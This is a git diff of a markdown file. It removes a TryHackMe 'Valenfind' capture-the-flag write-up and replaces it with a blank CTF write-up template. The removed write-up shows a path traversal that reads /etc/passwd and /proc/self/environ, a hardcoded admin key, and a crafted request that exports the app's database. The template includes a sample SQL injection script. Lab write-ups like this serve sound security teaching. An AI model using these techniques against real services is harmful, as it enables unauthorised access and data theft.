@@ -1,131 +1,100 @@
-# THM-Valenfind
->challenge:
-> *There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?*
+---
+title: "Your Awesome Write-up Title"
+date: "YYYY-MM-DD"
+author: "Your Name"
+tags: ["tag1", "tag2", "tag3"]
+read_time: "X min read"
+---
 
-## Metadata
-Room Name : Valenfind
-Platform: TryHackMe
-url: https://tryhackme.com/room/lafb2026e10
-Difficulty: Medium
-Category: web
-Points: 200
+# Your Awesome Write-up Title
 
-## Tags
-tryhackme
-web
-mediumlevel
+> A brief and engaging description of the challenge or topic goes here. What was the main objective? What makes this interesting?
+
+## Challenge Metadata
+
+- **Room Name:** Name of the CTF Room/Challenge
+- **Platform:** TryHackMe, HackTheBox, etc.
+- **URL:** [Link to the challenge](https://example.com)
+- **Difficulty:** Easy, Medium, Hard
+- **Category:** Web, PWN, Forensics, etc.
+- **Points:** Points awarded for the challenge
 
 ---
-# Scanning
-I started scanning the target for potential open ports.. and i found the ssh port open.
+
+## Introduction
+
+Start with an introduction to the topic. Briefly explain the context and what the reader can expect to learn from this write-up.
+
+## 1. Reconnaissance
+
+This is where the information gathering process begins. Describe the initial steps you took to understand the target.
+
+### Passive Reconnaissance
+- Publicly available information
+- WHOIS lookups
+- Google dorking
+
+### Active Reconnaissance
+- Port scanning
+- Service enumeration
+
+Here's an example of how to format a code snippet. The copy-to-clipboard functionality is automatically handled by the site's script when the markdown is converted to HTML.
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ nmap -sV -A -p22 -sC $TARGET
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 16:21 IST
-Nmap scan report for 10.49.137.221
-Host is up (0.086s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   256 fe:1f:8d:7f:92:38:3d:71:87:9d:01:65:de:03:4d:8c (ECDSA)
-|_  256 db:63:1e:b8:e4:25:80:10:18:d1:c3:7f:45:9b:2d:63 (ED25519)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose|phone
-Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3
-Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Lin
-ux 3.1 - 3.2 (92%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 3 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 22/tcp)
-HOP RTT      ADDRESS
-1   87.80 ms 192.168.128.1
-2   ...
-3   88.40 ms 10.49.137.221
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 11.07 seconds
-
+# Example of a command
+nmap -sV -A -p- 127.0.0.1
 ```
 
-- I tried connecting to it to check if i can use hydra to brute-force the password but yea, its key based authentication..
+## 2. Scanning and Enumeration
 
-- I then headed to the target webapp to start scanning.
+Detail the results of your scans. What ports are open? What services are running?
 
-- I created an account in the application and then logged in.. initially i thought its a injection kinda stuff but realized not because we have option to sign up!.
-
-- One user amongest all seems suspecious for me.. the `cupid` his discription says something like this - *"I keep the database secure. No peeking."* and this guy caught my attention for obvious reasons
-
-- But no lead for a while and slowly i noticed a option to change the profile theme.
-![[Pasted image 20260214173729.png]]
-
-
-- Opened up burp suite and noticed that the profile themes are being fetched dynamically.
-
-
-![[2026-02-14_17-03-18.png]]
-
-The endpoint is `/api/fetch_layout`
-
-Time for [[Path Traversal]], tried to fetch the `/etc/passwd`
-![[2026-02-14_16-26-40.png]]
-
-# some commands that made my work easier
-In linux we have 
-> `/proc/self/cmdline`
-> The command stated will return the exact process that handles/started current process, (self).
-> In this case all the processes are being handeled by the webapp and hence this returns the file that is responsible for this process.
-
-
-> `/proc/self/envron`
-> This is quite obvyous -  returns the environment variables
-
-
-![[2026-02-14_16-37-54.png]]
-
-The above screenshot show the path of the `app.py`
-
-Now i tried to read up the source code of the app and the code has the following details:
-![[2026-02-14_16-51-42.png]]
-```python
-ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
+```plaintext
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
 ```
+
+## 3. Gaining Access (Exploitation)
+
+This is the core of the write-up. Explain the vulnerability you found and how you exploited it.
+
+### Vulnerability Analysis
+- Describe the vulnerability (e.g., SQL Injection, Path Traversal, RCE).
+- Explain why it exists.
+
+### Exploitation Steps
+- Provide a step-by-step guide on how to exploit the vulnerability.
+- Include code snippets and screenshots where necessary.
 
 ```python
-@app.route('/api/admin/export_db')
-def export_db():
-    auth_header = request.headers.get('X-Valentine-Token')
-    
-    if auth_header == ADMIN_API_KEY:
-        try:
-            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
-        except Exception as e:
-            return str(e)
-    else:
-        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403
+# Example of an exploit script
+import requests
+
+url = "http://example.com/vulnerable_endpoint"
+payload = {"param": "' OR 1=1 --"}
+
+response = requests.post(url, data=payload)
+print(response.text)
 ```
 
-examining the above evidences, we can create a web request accordingly:
+## 4. Privilege Escalation
 
-```nginx
-GET /api/admin/export_db HTTP/1.1
-Host: 10.49.137.221:5000
-Accept-Language: en-US,en;q=0.9
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
-Accept: */*
-Referer: http://10.49.137.221:5000/profile/cupid
-Accept-Encoding: gzip, deflate, br
-X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
-Cookie: session=eyJsaWtlZCI6W10sInVzZXJfaWQiOjEwLCJ1c2VybmFtZSI6InRlc3QxIn0.aZBT-Q.p7M_b3Nv53KBtJd2E0oSRDFE-ek
-Connection: keep-alive
+If applicable, describe how you escalated your privileges on the system.
 
+- **Enumeration:** What did you look for after getting initial access? (e.g., SUID binaries, cron jobs, kernel exploits)
+- **Exploitation:** How did you get root/administrator access?
 
-```
+## 5. Post-Exploitation & Loot
 
-![[2026-02-14_17-00-44 1.png]]
+What did you do after gaining full control? Did you find any flags or interesting data?
 
-This brings up the flag.
+## Conclusion
+
+Summarize the key takeaways from this write-up. What did you learn? What are the main remediation steps to prevent this kind of vulnerability?
+
+> "A cool quote or a final thought." — Author
+
+---
+
+*This is a template for a CTF write-up. Replace the placeholder text with your own content.*
